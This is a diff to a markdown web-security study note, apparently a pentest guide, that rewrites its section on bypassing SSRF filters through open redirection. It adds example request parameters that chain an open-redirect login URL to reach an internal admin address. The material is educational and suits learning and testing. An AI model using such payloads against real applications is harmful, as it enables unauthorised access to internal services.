@@ -44,10 +44,19 @@ It is more difficult to exploit because you will be able to exploit only well-kn
 
 ### <mark style="color:yellow;">Bypassing SSRF filters via open redirection</mark>
 
-It works because the application first validates that the supplied api URL is on an allowed domain
+1. Identify endpoint with open redirect
 
 ```
-api=http://domain.net/product?productId=6&path=http://192.168.0.68/admin
+https://website.com/login?redirect=/my-account
+```
+
+1. Have the server execute a request that performs a redirect
+
+```sh
+# Original
+api=http://website.com/product?productId=6
+# Exploit
+api=http://website.com/login?redirect=http://192.168.0.68/admin
 ```
 
 ## <mark style="color:yellow;">Finding hidden attack surface for SSRF</mark>
